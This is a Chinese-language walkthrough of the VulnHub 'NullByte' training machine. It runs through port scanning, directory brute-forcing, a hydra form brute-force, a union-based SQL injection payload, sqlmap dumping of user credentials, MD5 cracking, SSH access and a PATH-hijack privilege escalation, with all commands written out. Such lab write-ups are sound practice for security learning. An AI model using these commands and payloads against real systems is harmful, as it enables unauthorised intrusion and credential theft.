
VMware打开后该设置报错:vmware workstation 不可恢复错误:(vmui)

## 解决
右键虚拟机名称->管理->更改硬件兼容性，改为VM16.x即可


## 靶机信息

地址：https://download.vulnhub.com/nullbyte/NullByte.ova.zip
目标：访问 /root/proof.txt 并按照说明进行操作。
级别：初级到中级。

## Recon
### 靶机信息:
```nmap
sudo nmap -sn 192.168.1.0/24 
//IP:192.168.1.138

sudo nmap -sT --min-rate 10000 -p- 192.168.1.138
PORT      STATE SERVICE
80/tcp    open  http
111/tcp   open  rpcbind
777/tcp   open  multiling-http
39273/tcp open  unknown

```

## Web
主页是一个全视之眼:
![[Pasted image 20231005151158.png]]

### 目录爆破
```shell
sudo gobuster dir -u http://192.168.1.138 -w /usr/share/wordlists/dirb/common.txt
```
![[Pasted image 20231005151748.png]]
扫描到两个敏感目录
uploads目录没有可利用内容：
![[Pasted image 20231005152400.png]]
PhpMyAdmin是一个登录界面:
![[Pasted image 20231005152428.png]]

## 图片隐藏信息

回到主页下载主页的图片
```shell
wget http://192.168.1.138/main.gif 
```
Exiftool分析图片
```shell
exiftool main.gif
```
![[Pasted image 20231005152843.png]]

多次尝试后发现这是一个目录

## 暴力破解

![[Pasted image 20231005152953.png]]
- burp suite分析数据包


- hydra
```shell
sudo hydra 192.168.1.138 http-form-post "/kzMb5nVYJw/index.php:key=^PASS^:invalid key" -l a -P /usr/share/wordlists/rockyou.txt
```

:key=^PASS^:POST的内容
:invalid key:错误信息
-l: 用户名
-P:密码(使用字典)

![[Pasted image 20231005162121.png]]
得到Key:``elite

## SQL注入
输入key后得到如下界面
![[Pasted image 20231005163005.png]]
随意输入内容，返回 Fetched data successfully，判断可能有数据库，尝试后发现是"闭合。
![[Pasted image 20231005163140.png]]

输入 `" or 1=1 -- "`，回显内容显示有三个字段

![[Pasted image 20231005163609.png]]

```SQL
" union select user(),version(),database() -- "
//数据库信息
EMP ID :root@localhost
EMP NAME : 5.5.44-0+deb8u1
EMP POSITION : seth 
```

## SQLMAP

```Shell
sudo sqlmap -u http://192.168.1.138/kzMb5nVYJw/420search.php?usrtosearch=1 --dbs 
```

![[Pasted image 20231005164932.png]]
```shell
sudo sqlmap -u http://192.168.1.138/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth --tables
```
![[Pasted image 20231005165024.png]]
```shell
sudo sqlmap -u http://192.168.1.138/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users --columns
```
![[Pasted image 20231005165139.png]]
```shell
sudo sqlmap -u http://192.168.1.138/kzMb5nVYJw/420search.php?usrtosearch=1 -D seth -T users -C user,pass --dump

//得到用户名及密文
ramses | YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE |
| isis   | --not allowed--
```

### 密码破解
得到的是base64编码
```shell
echo 'YzZkNmJkN2ViZjgwNmY0M2M3NmFjYzM2ODE3MDNiODE' | base64 -d

// c6d6bd7ebf806f43c76acc3681703b81
```
解密
```shell
hash-identifier c6d6bd7ebf806f43c76acc3681703b81
```
![[Pasted image 20231005165709.png]]
在线md5解密：https://www.cmd5.com/
得到明文:omega

## SSH
这个靶机的ssh端口是777
```shell
nmap -sT -p 777 -sV 192.168.1.138

PORT    STATE SERVICE VERSION
777/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
```

```shell
sudo ssh ramses@192.168.1.138 -p 777
```

## 提权

```shell
sudo -l
Sorry, user ramses may not run sudo on NullByte.
//ramses用户没有sudo
cat /home/ramses/.bash_history

sudo -s
su eric
exit
ls
clear
cd /var/www
cd backup/
ls
./procwatch 
clear
sudo -s
cd /
ls
exit
//bash历史记录看到可执行文件procwatch
```


![[Pasted image 20231005182627.png]]
看到ps命令有更高的权限

```shell
ln -s /bin/sh ps
export PATH=.:$PATH
./procwatch
```

![[Pasted image 20231005184506.png]]

成功提权

![[Pasted image 20231005184605.png]]